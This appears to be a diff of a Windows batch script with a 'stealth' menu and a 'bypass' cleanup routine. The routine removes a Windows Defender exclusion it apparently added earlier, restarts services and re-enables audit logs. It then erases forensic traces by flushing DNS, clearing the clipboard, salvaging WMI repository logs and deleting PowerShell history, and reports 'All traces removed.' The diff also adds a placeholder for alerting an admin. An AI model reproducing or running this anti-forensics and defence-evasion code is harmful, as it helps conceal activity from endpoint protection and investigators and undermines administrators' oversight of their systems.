@@ -250,7 +250,6 @@ goto STEALTH_MENU
 
 :BYPASS
 echo Starting Bypass - cleanup and restore...
-timeout /t 1 >nul
 
 echo Starting Data Usage Service...
 sc start "DataUsageSvc" >nul 2>&1
@@ -259,7 +258,7 @@ echo Enabling audit logs...
 call :ENABLE_AUDIT_LOGS
 
 echo Removing Windows Defender exclusion for EXE...
-powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Remove-MpPreference -ExclusionPath '%SETUP_EXE%' } catch { }" >nul 2>&1
+powershell -Command "Remove-MpPreference -ExclusionPath '%SETUP_EXE%'" >nul 2>&1
 
 echo Running cleanup...
 
@@ -284,24 +283,27 @@ ipconfig /flushdns >nul
 :: Clear clipboard
 echo off | clip
 
-:: WMI Logging Cleanup
+:: Clear WMI repository - WMI Logging Cleanup
 echo Cleaning WMI repository logs...
 winmgmt /salvagerepository >nul 2>&1
 
-:: Clean PowerShell traces
+:: Clean PowerShell history files and logs
 call :CLEAN_PS_HISTORY
 
 echo Cleanup done. All traces removed.
-echo.
-choice /m "Restart required to fully flush traces. Restart now?"
-if errorlevel 2 goto STEALTH_MENU
-if errorlevel 1 (
-    shutdown /r /t 5
-    timeout /t 6 >nul
-)
-
+pause
 goto STEALTH_MENU
 
+:: === Alert Admin Placeholder ===
+
+:ALERT_ADMIN
+cls
+echo Enter your alert message (max 20 words):
+set /p alertmsg= 
+echo You entered: %alertmsg%
+echo (Feature to send message not implemented yet)
+pause
+goto STEALTH_MENU
 
 :: === Exit ===
 
